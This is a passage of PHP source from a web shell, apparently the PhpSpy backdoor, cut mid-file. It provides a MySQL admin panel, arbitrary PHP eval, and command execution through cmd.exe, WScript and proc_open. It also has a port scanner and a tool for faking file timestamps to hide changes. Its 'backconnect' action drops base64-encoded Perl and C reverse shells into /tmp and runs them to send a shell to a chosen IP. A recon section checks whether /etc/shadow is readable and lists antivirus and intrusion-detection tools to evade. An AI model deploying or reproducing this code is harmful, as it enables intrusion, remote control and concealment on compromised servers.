           makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
           p(':');
           makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
           p('DBUser:');
           makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
           p('DBPass:');
           makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
           p('DBCharset:');
           makeselect(array('name'=>'charset','option'=>$charsetdb,'selected'=>$charset,'nokey'=>1));
           makeinput(array('name'=>'connect','value'=>'Connect','type'=>'submit','class'=>'bt'));
           p('</p>');
           formfoot();
       
           //操作记录
           formhead(array('name'=>'recordlist'));
           makehide('doing');
           makehide('action','mysqladmin');
           makehide('base64');
           makehide('tablename');
           p($dbform);
           formfoot();
       
           //选定数据库
           formhead(array('name'=>'setdbname'));
           makehide('action','mysqladmin');
           p($dbform);
           if (!$dbname) {
               makehide('dbname');
           }
           formfoot();
       
           //选定表
           formhead(array('name'=>'settable'));
           makehide('action','mysqladmin');
           p($dbform);
           makehide('tablename');
           makehide('page',$page);
           makehide('doing');
           formfoot();
       
           $cachetables = array();     
           $pagenum = 30;
           $page = intval($page);
           if($page) {
               $start_limit = ($page - 1) * $pagenum;
           } else {
               $start_limit = 0;
               $page = 1;
           }
           if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
               $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
               //获取数据库信息
               $mysqlver = mysql_get_server_info();
               p('<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
               $highver = $mysqlver > '4.1' ? 1 : 0;
       
               //获取数据库
               $query = q("SHOW DATABASES");
               $dbs = array();
               $dbs[] = '-- Select a database --';
               while($db = mysql_fetch_array($query)) {
                   $dbs[$db['Database']] = $db['Database'];
               }
               makeselect(array('title'=>'Please select a database:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));
               $tabledb = array();
               if ($dbname) {
                   p('<p>');
                   p('Current dababase: <a href="javascript:moddbname(\''.$dbname.'\');">'.$dbname.'</a>');
                   if ($tablename) {
                       p(' | Current Table: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$tablename.'\', \'drop\');">Drop</a> ]');
                   }
                   p('</p>');
                   mysql_select_db($dbname);
       
                   $getnumsql = '';
                   $runquery = 0;
                   if ($sql_query) {
                       $runquery = 1;
                   }
                   $allowedit = 0;
                   if ($tablename && !$sql_query) {
                       $sql_query = "SELECT * FROM $tablename";
                       $getnumsql = $sql_query;
                       $sql_query = $sql_query." LIMIT $start_limit, $pagenum";
                       $allowedit = 1;
                   }
                   p('<form action="'.$self.'" method="POST">');
                   p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database '.$dbname.':</td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
                   makehide('tablename', $tablename);
                   makehide('action','mysqladmin');
                   p($dbform);
                   p('</form>');
                   if ($tablename || ($runquery && $sql_query)) {
                       if ($doing == 'structure') {
                           $result = q("SHOW FULL COLUMNS FROM $tablename");
                           $rowdb = array();
                           while($row = mysql_fetch_array($result)) {
                               $rowdb[] = $row;
                           }
                           p('<h3>Structure</h3>');
                           p('<table border="0" cellpadding="3" cellspacing="0">');
                           p('<tr class="head">');
                           p('<td>Field</td>');
                           p('<td>Type</td>');
                           p('<td>Collation</td>');
                           p('<td>Null</td>');
                           p('<td>Key</td>');
                           p('<td>Default</td>');
                           p('<td>Extra</td>');
                           p('<td>Privileges</td>');
                           p('<td>Comment</td>');
                           p('</tr>');
                           foreach ($rowdb as $row) {
                               $thisbg = bg();
                               p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
                               p('<td>'.$row['Field'].'</td>');
                               p('<td>'.$row['Type'].'</td>');
                               p('<td>'.$row['Collation'].'&nbsp;</td>');
                               p('<td>'.$row['Null'].'&nbsp;</td>');
                               p('<td>'.$row['Key'].'&nbsp;</td>');
                               p('<td>'.$row['Default'].'&nbsp;</td>');
                               p('<td>'.$row['Extra'].'&nbsp;</td>');
                               p('<td>'.$row['Privileges'].'&nbsp;</td>');
                               p('<td>'.$row['Comment'].'&nbsp;</td>');
                               p('</tr>');
                           }
                           tbfoot();
                           $result = q("SHOW INDEX FROM $tablename");
                           $rowdb = array();
                           while($row = mysql_fetch_array($result)) {
                               $rowdb[] = $row;
                           }
                           p('<h3>Indexes</h3>');
                           p('<table border="0" cellpadding="3" cellspacing="0">');
                           p('<tr class="head">');
                           p('<td>Keyname</td>');
                           p('<td>Type</td>');
                           p('<td>Unique</td>');
                           p('<td>Packed</td>');
                           p('<td>Seq_in_index</td>');
                           p('<td>Field</td>');
                           p('<td>Cardinality</td>');
                           p('<td>Collation</td>');
                           p('<td>Null</td>');
                           p('<td>Comment</td>');
                           p('</tr>');
                           foreach ($rowdb as $row) {
                               $thisbg = bg();
                               p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
                               p('<td>'.$row['Key_name'].'</td>');
                               p('<td>'.$row['Index_type'].'</td>');
                               p('<td>'.($row['Non_unique'] ? 'No' : 'Yes').'&nbsp;</td>');
                               p('<td>'.($row['Packed'] === null ? 'No' : $row['Packed']).'&nbsp;</td>');
                               p('<td>'.$row['Seq_in_index'].'</td>');
                               p('<td>'.$row['Column_name'].($row['Sub_part'] ? '('.$row['Sub_part'].')' : '').'&nbsp;</td>');
                               p('<td>'.($row['Cardinality'] ? $row['Cardinality'] : 0).'&nbsp;</td>');
                               p('<td>'.$row['Collation'].'&nbsp;</td>');
                               p('<td>'.$row['Null'].'&nbsp;</td>');
                               p('<td>'.$row['Comment'].'&nbsp;</td>');
                               p('</tr>');
                           }
                           tbfoot();
                       } elseif ($doing == 'insert' || $doing == 'edit') {
                           $result = q('SHOW COLUMNS FROM '.$tablename);
                           while ($row = mysql_fetch_array($result)) {
                               $rowdb[] = $row;
                           }
                           $rs = array();
                           if ($doing == 'insert') {
                               p('<h2>Insert new line in '.$tablename.' table &raquo;</h2>');
                           } else {
                               p('<h2>Update record in '.$tablename.' table &raquo;</h2>');
                               $where = base64_decode($base64);
                               $result = q("SELECT * FROM $tablename WHERE $where LIMIT 1");
                               $rs = mysql_fetch_array($result);
                           }
                           p('<form method="post" action="'.$self.'">');
                           p($dbform);
                           makehide('action','mysqladmin');
                           makehide('tablename',$tablename);
                           p('<table border="0" cellpadding="3" cellspacing="0">');
                           foreach ($rowdb as $row) {
                               if ($rs[$row['Field']]) {
                                   $value = htmlspecialchars($rs[$row['Field']]);
                               } else {
                                   $value = '';
                               }
                               $thisbg = bg();
                               p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
                               if ($row['Key'] == 'UNI' || $row['Extra'] == 'auto_increment' || $row['Key'] == 'PRI') {
                                   p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td>'.$value.'&nbsp;</td></tr>');
                               } else {                            
                                   p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td><textarea class="area" name="insertsql['.$row['Field'].']" style="width:500px;height:60px;overflow:auto;">'.$value.'</textarea></td></tr>');
                               }
                           }
                           if ($doing == 'insert') {
                               p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>');
                           } else {
                               p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>');
                               makehide('base64', $base64);
                           }
                           p('</table></form>');
                       } else {
                           $querys = @explode(';',$sql_query);
                           foreach($querys as $num=>$query) {
                               if ($query) {
                                   p("<p><b>Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."</b></p>");
                                   switch(qy($query))
                                   {
                                       case 0:
                                           p('<h2>Error : '.mysql_error().'</h2>');
                                           break;  
                                       case 1:
                                           if (strtolower(substr($query,0,13)) == 'select * from') {
                                               $allowedit = 1;
                                           }
                                           if ($getnumsql) {
                                               $tatol = mysql_num_rows(q($getnumsql));
                                               $multipage = multi($tatol, $pagenum, $page, $tablename);
                                           }
                                           if (!$tablename) {
                                               $sql_line = str_replace(array("\r", "\n", "\t"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));
                                               $sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
                                               preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i",$sql_line,$matches);
                                               $tablename = $matches[1][0];
                                           }
       
                                           /*********************/
                                           $getfield = q("SHOW COLUMNS FROM $tablename");
                                           $rowdb = array();
                                           $keyfied = ''; //主键字段
                                           while($row = @mysql_fetch_assoc($getfield)) {
                                               $rowdb[$row['Field']]['Key'] = $row['Key'];
                                               $rowdb[$row['Field']]['Extra'] = $row['Extra'];
                                               if ($row['Key'] == 'UNI' || $row['Key'] == 'PRI') {
                                                   $keyfied = $row['Field'];
                                               }
                                           }
                                           /*********************/                                 
                                           //直接浏览表按照主键降序排列
                                           if ($keyfied && strtolower(substr($query,0,13)) == 'select * from') {
                                               $query = str_replace(" LIMIT ", " order by $keyfied DESC LIMIT ", $query);
                                           }
       
                                           $result = q($query);
       
                                           p($multipage);
                                           p('<table border="0" cellpadding="3" cellspacing="0">');
                                           p('<tr class="head">');
                                           if ($allowedit) p('<td>Action</td>');
                                           $fieldnum = @mysql_num_fields($result);
                                           for($i=0;$i<$fieldnum;$i++){
                                               $name = @mysql_field_name($result, $i);
                                               $type = @mysql_field_type($result, $i);
                                               $len = @mysql_field_len($result, $i);
                                               p("<td nowrap>$name<br><span>$type($len)".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '<b> - PRIMARY</b>' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '')."</span></td>");
                                           }
                                           p('</tr>');
                                           
                                           while($mn = @mysql_fetch_assoc($result)){
                                               $thisbg = bg();
                                               p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
                                               $where = $tmp = $b1 = '';
                                               //选取条件字段用
                                               foreach($mn as $key=>$inside){
                                                   if ($inside) {
                                                       //查找主键、唯一属性、自动增加的字段，找到就停止，否则组合所有字段作为条件。
                                                       if ($rowdb[$key]['Key'] == 'UNI' || $rowdb[$key]['Extra'] == 'auto_increment' || $rowdb[$key]['Key'] == 'PRI') {
                                                           $where = $key."='".addslashes($inside)."'";
                                                           break;
                                                       }
                                                       $where .= $tmp.$key."='".addslashes($inside)."'";
                                                       $tmp = ' AND ';
                                                   }
                                               }
                                               //读取记录用
                                               foreach($mn as $key=>$inside){
                                                   $b1 .= '<td nowrap>'.html_clean($inside).'&nbsp;</td>';
                                               }
                                               $where = base64_encode($where);
       
                                               if ($allowedit) p('<td nowrap><a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');">Edit</a> | <a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');">Del</a></td>');
       
                                               p($b1);
                                               p('</tr>');
                                               unset($b1);
                                           }
                                           p('<tr class="head">');
                                           if ($allowedit) p('<td>Action</td>');
                                           $fieldnum = @mysql_num_fields($result);
                                           for($i=0;$i<$fieldnum;$i++){
                                               $name = @mysql_field_name($result, $i);
                                               $type = @mysql_field_type($result, $i);
                                               $len = @mysql_field_len($result, $i);
                                               p("<td nowrap>$name<br><span>$type($len)".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '<b> - PRIMARY</b>' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '')."</span></td>");
                                           }
                                           p('</tr>');
                                           tbfoot();
                                           p($multipage);
                                           break;
                                       case 2:
                                           $ar = mysql_affected_rows();
                                           p('<h2>affected rows : <b>'.$ar.'</b></h2>');
                                           break;
                                   }
                               }
                           }
                       }
                   } else {
                       $query = q("SHOW TABLE STATUS");
                       $table_num = $table_rows = $data_size = 0;
                       $tabledb = array();
                       while($table = mysql_fetch_array($query)) {
                           $data_size = $data_size + $table['Data_length'];
                           $table_rows = $table_rows + $table['Rows'];
                           $table['Data_length'] = sizecount($table['Data_length']);
                           $table_num++;
                           $tabledb[] = $table;
                       }
                       $data_size = sizecount($data_size);
                       unset($table);
                       p('<table border="0" cellpadding="0" cellspacing="0">');
                       p('<form action="'.$self.'" method="POST">');
                       makehide('action','mysqladmin');
                       p($dbform);
                       p('<tr class="head">');
                       p('<td width="2%" align="center">&nbsp;</td>');
                       p('<td>Name</td>');
                       p('<td>Rows</td>');
                       p('<td>Data_length</td>');
                       p('<td>Create_time</td>');
                       p('<td>Update_time</td>');
                       if ($highver) {
                           p('<td>Engine</td>');
                           p('<td>Collation</td>');
                       }
                       p('<td>Operate</td>');
                       p('</tr>');
                       foreach ($tabledb as $key => $table) {
                           $thisbg = bg();
                           p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
                           p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="'.$table['Name'].'" /></td>');
                           p('<td><a href="javascript:settable(\''.$table['Name'].'\');">'.$table['Name'].'</a></td>');
                           p('<td>'.$table['Rows'].'</td>');
                           p('<td>'.$table['Data_length'].'</td>');
                           p('<td>'.$table['Create_time'].'&nbsp;</td>');
                           p('<td>'.$table['Update_time'].'&nbsp;</td>');
                           if ($highver) {
                               p('<td>'.$table['Engine'].'</td>');
                               p('<td>'.$table['Collation'].'</td>');
                           }
                           p('<td><a href="javascript:settable(\''.$table['Name'].'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'drop\');">Drop</a></td>');
                           p('</tr>');
                       }
                       p('<tr class="head">');
                       p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>');
                       p('<td>Name</td>');
                       p('<td>Rows</td>');
                       p('<td>Data_length</td>');
                       p('<td>Create_time</td>');
                       p('<td>Update_time</td>');
                       if ($highver) {
                           p('<td>Engine</td>');
                           p('<td>Collation</td>');
                       }
                       p('<td>Operate</td>');
                       p('</tr>');
                       p('<tr class='.bg().'>');
                       p('<td>&nbsp;</td>');
                       p('<td>Total tables: '.$table_num.'</td>');
                       p('<td>'.$table_rows.'</td>');
                       p('<td>'.$data_size.'</td>');
                       p('<td colspan="'.($highver ? 5 : 3).'">&nbsp;</td>');
                       p('</tr>');
       
                       p("<tr class=\"".bg()."\"><td colspan=\"".($highver ? 9 : 7)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"path\" value=\"".SA_ROOT.$dbname.".sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"submit\" value=\"Export selection table\" /></td></tr>");
                       makehide('doing','backupmysql');
                       formfoot();
                       p("</table>");
                       fr($query);
                   }
               }
           }
           tbfoot();
           @mysql_close();
       }//end mysql
       
       elseif ($action == 'backconnect') {
           !$yourip && $yourip = $_SERVER['REMOTE_ADDR'];
           !$yourport && $yourport = '12345';
           $usedb = array('perl'=>'perl','c'=>'c');
       
           $back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
               "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
               "hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
               "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
               "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
               "KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
               "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
           $back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC".
               "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb".
               "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd".
               "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ".
               "sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC".
               "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".
               "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".
               "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
       
           if ($start && $yourip && $yourport && $use){
               if ($use == 'perl') {
                   cf('/tmp/angel_bc',$back_connect);
                   $res = execute(which('perl')." /tmp/angel_bc $yourip $yourport &");
               } else {
                   cf('/tmp/angel_bc.c',$back_connect_c);
                   $res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
                   @unlink('/tmp/angel_bc.c');
                   $res = execute("/tmp/angel_bc $yourip $yourport &");
               }
               m("Now script try connect to $yourip port $yourport ...");
           }
       
           formhead(array('title'=>'Back Connect'));
           makehide('action','backconnect');
           p('<p>');
           p('Your IP:');
           makeinput(array('name'=>'yourip','size'=>20,'value'=>$yourip));
           p('Your Port:');
           makeinput(array('name'=>'yourport','size'=>15,'value'=>$yourport));
           p('Use:');
           makeselect(array('name'=>'use','option'=>$usedb,'selected'=>$use));
           makeinput(array('name'=>'start','value'=>'Start','type'=>'submit','class'=>'bt'));
           p('</p>');
           formfoot();
       }//end
       
       elseif ($action == 'portscan') {
           !$scanip && $scanip = '127.0.0.1';
           !$scanport && $scanport = '21,25,80,110,135,139,445,1433,3306,3389,5631,43958';
           formhead(array('title'=>'Port Scan'));
           makehide('action','portscan');
           p('<p>');
           p('IP:');
           makeinput(array('name'=>'scanip','size'=>20,'value'=>$scanip));
           p('Port:');
           makeinput(array('name'=>'scanport','size'=>80,'value'=>$scanport));
           makeinput(array('name'=>'startscan','value'=>'Scan','type'=>'submit','class'=>'bt'));
           p('</p>');
           formfoot();
       
           if ($startscan) {
               p('<h2>Result &raquo;</h2>');
               p('<ul class="info">');
               foreach(explode(',', $scanport) as $port) {
                   $fp = @fsockopen($scanip, $port, &$errno, &$errstr, 1); 
                   if (!$fp) {
                       p('<li>'.$scanip.':'.$port.' ------------------------ <span style="font-weight:bold;color:#f00;">Close</span></li>');
                  } else {
                       p('<li>'.$scanip.':'.$port.' ------------------------ <span style="font-weight:bold;color:#080;">Open</span></li>');
                       @fclose($fp);
                  } 
               }
               p('</ul>');
           }
       }
       
       elseif ($action == 'eval') {
           $phpcode = trim($phpcode);
           if($phpcode){
               if (!preg_match('#<\?#si', $phpcode)) {
                   $phpcode = "<?php\n\n{$phpcode}\n\n?>";
               }
               eval("?".">$phpcode<?");
           }
           formhead(array('title'=>'Eval PHP Code'));
           makehide('action','eval');
           maketext(array('title'=>'PHP Code','name'=>'phpcode', 'value'=>$phpcode));
           p('<p><a href="http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/" target="_blank">Get plugins</a></p>');
           formfooter();
       }//end eval
       
       elseif ($action == 'editfile') {
           if(file_exists($opfile)) {
               $fp=@fopen($opfile,'r');
               $contents=@fread($fp, filesize($opfile));
               @fclose($fp);
               $contents=htmlspecialchars($contents);
           }
           formhead(array('title'=>'Create / Edit File'));
           makehide('action','file');
           makehide('dir',$nowpath);
           makeinput(array('title'=>'Current File (import new file name and new file)','name'=>'editfilename','value'=>$opfile,'newline'=>1));
           maketext(array('title'=>'File Content','name'=>'filecontent','value'=>$contents));
           formfooter();
           
           goback();
       
       }//end editfile
       
       elseif ($action == 'newtime') {
           $opfilemtime = @filemtime($opfile);
           //$time = strtotime("$year-$month-$day $hour:$minute:$second");
           $cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
           formhead(array('title'=>'Clone folder/file was last modified time'));
           makehide('action','file');
           makehide('dir',$nowpath);
           makeinput(array('title'=>'Alter folder/file','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
           makeinput(array('title'=>'Reference folder/file (fullpath)','name'=>'tarfile','size'=>120,'newline'=>1));
           formfooter();
           formhead(array('title'=>'Set last modified'));
           makehide('action','file');
           makehide('dir',$nowpath);
           makeinput(array('title'=>'Current folder/file (fullpath)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
           p('<p>year:');
           makeinput(array('name'=>'year','value'=>date('Y',$opfilemtime),'size'=>4));
           p('month:');
           makeinput(array('name'=>'month','value'=>date('m',$opfilemtime),'size'=>2));
           p('day:');
           makeinput(array('name'=>'day','value'=>date('d',$opfilemtime),'size'=>2));
           p('hour:');
           makeinput(array('name'=>'hour','value'=>date('H',$opfilemtime),'size'=>2));
           p('minute:');
           makeinput(array('name'=>'minute','value'=>date('i',$opfilemtime),'size'=>2));
           p('second:');
           makeinput(array('name'=>'second','value'=>date('s',$opfilemtime),'size'=>2));
           p('</p>');
           formfooter();
           goback();
       }//end newtime
       
       elseif ($action == 'shell') {
           if (IS_WIN && IS_COM) {
               if($program && $parameter) {
                   $shell= new COM('Shell.Application');
                   $a = $shell->ShellExecute($program,$parameter);
                   m('Program run has '.(!$a ? 'success' : 'fail'));
               }
               !$program && $program = 'c:\windows\system32\cmd.exe';
               !$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';
               formhead(array('title'=>'Execute Program'));
               makehide('action','shell');
               makeinput(array('title'=>'Program','name'=>'program','value'=>$program,'newline'=>1));
               p('<p>');
               makeinput(array('title'=>'Parameter','name'=>'parameter','value'=>$parameter));
               makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
               p('</p>');
               formfoot();
           }
           formhead(array('title'=>'Execute Command'));
           makehide('action','shell');
           if (IS_WIN && IS_COM) {
               $execfuncdb = array('phpfunc'=>'phpfunc','wscript'=>'wscript','proc_open'=>'proc_open');
               makeselect(array('title'=>'Use:','name'=>'execfunc','option'=>$execfuncdb,'selected'=>$execfunc,'newline'=>1));
           }
           p('<p>');
           makeinput(array('title'=>'Command','name'=>'command','value'=>htmlspecialchars($command)));
           makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
           p('</p>');
           formfoot();
       
           if ($command) {
               p('<hr width="100%" noshade /><pre>');
               if ($execfunc=='wscript' && IS_WIN && IS_COM) {
                   $wsh = new COM('WScript.shell');
                   $exec = $wsh->exec('cmd.exe /c '.$command);
                   $stdout = $exec->StdOut();
                   $stroutput = $stdout->ReadAll();
                   echo $stroutput;
               } elseif ($execfunc=='proc_open' && IS_WIN && IS_COM) {
                   $descriptorspec = array(
                      0 => array('pipe', 'r'),
                      1 => array('pipe', 'w'),
                      2 => array('pipe', 'w')
                   );
                   $process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
                   if (is_resource($process)) {
                       fwrite($pipes[0], $command."\r\n");
                       fwrite($pipes[0], "exit\r\n");
                       fclose($pipes[0]);
                       while (!feof($pipes[1])) {
                           echo fgets($pipes[1], 1024);
                       }
                       fclose($pipes[1]);
                       while (!feof($pipes[2])) {
                           echo fgets($pipes[2], 1024);
                       }
                       fclose($pipes[2]);
                       proc_close($process);
                   }
               } else {
                   echo(execute($command));
               }
               p('</pre>');
           }
       }//end shell
       
       elseif ($action == 'phpenv') {
           $upsize=getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
           $adminmail=isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
           !$dis_func && $dis_func = 'No';     
           $info = array(
               1 => array('Server Time',date('Y/m/d h:i:s',$timestamp)),
               2 => array('Server Domain',$_SERVER['SERVER_NAME']),
               3 => array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),
               4 => array('Server OS',PHP_OS),
               5 => array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),
               6 => array('Server Software',$_SERVER['SERVER_SOFTWARE']),
               7 => array('Server Web Port',$_SERVER['SERVER_PORT']),
               8 => array('PHP run mode',strtoupper(php_sapi_name())),
               9 => array('The file path',__FILE__),
       
               10 => array('PHP Version',PHP_VERSION),
               11 => array('PHPINFO',(IS_PHPINFO ? '<a href="javascript:g(\'phpinfo\');">Yes</a>' : 'No')),
               12 => array('Safe Mode',getcfg('safe_mode')),
               13 => array('Administrator',$adminmail),
               14 => array('allow_url_fopen',getcfg('allow_url_fopen')),
               15 => array('enable_dl',getcfg('enable_dl')),
               16 => array('display_errors',getcfg('display_errors')),
               17 => array('register_globals',getcfg('register_globals')),
               18 => array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),
               19 => array('memory_limit',getcfg('memory_limit')),
               20 => array('post_max_size',getcfg('post_max_size')),
               21 => array('upload_max_filesize',$upsize),
               22 => array('max_execution_time',getcfg('max_execution_time').' second(s)'),
               23 => array('disable_functions',$dis_func),
           );
       
           if($phpvarname) {
               m($phpvarname .' : '.getcfg($phpvarname));
           }
       
           formhead(array('title'=>'Server environment'));
           makehide('action','phpenv');
           makeinput(array('title'=>'Please input PHP configuration parameter(eg:magic_quotes_gpc)','name'=>'phpvarname','value'=>$phpvarname,'newline'=>1));
           formfooter();
       
           $hp = array(0=> 'Server', 1=> 'PHP');
           for($a=0;$a<2;$a++) {
               p('<h2>'.$hp[$a].' &raquo;</h2>');
               p('<ul class="info">');
               if ($a==0) {
                   for($i=1;$i<=9;$i++) {
                       p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
                   }
               } elseif ($a == 1) {
                   for($i=10;$i<=23;$i++) {
                       p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
                   }
               }
               p('</ul>');
           }
       }//end phpenv
       
       elseif ($action == 'secinfo') {
           
           secparam('Server software', @getenv('SERVER_SOFTWARE'));
           secparam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS['disable_functions']:'none');
           secparam('Open base dir', @ini_get('open_basedir'));
           secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
           secparam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
           secparam('cURL support', function_exists('curl_version')?'enabled':'no');
           $temp=array();
           if(function_exists('mysql_get_client_info'))
               $temp[] = "MySql (".mysql_get_client_info().")";
           if(function_exists('mssql_connect'))
               $temp[] = "MSSQL";
           if(function_exists('pg_connect'))
               $temp[] = "PostgreSQL";
           if(function_exists('oci_connect'))
               $temp[] = "Oracle";
           secparam('Supported databases', implode(', ', $temp));
           
           if( !IS_WIN ) {
               $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
               $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
               $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
               secparam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "yes" : 'no');
               secparam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "yes" : 'no');
               secparam('OS version', @file_get_contents('/proc/version'));
               secparam('Distr name', @file_get_contents('/etc/issue.net'));
               $safe_mode = @ini_get('safe_mode');
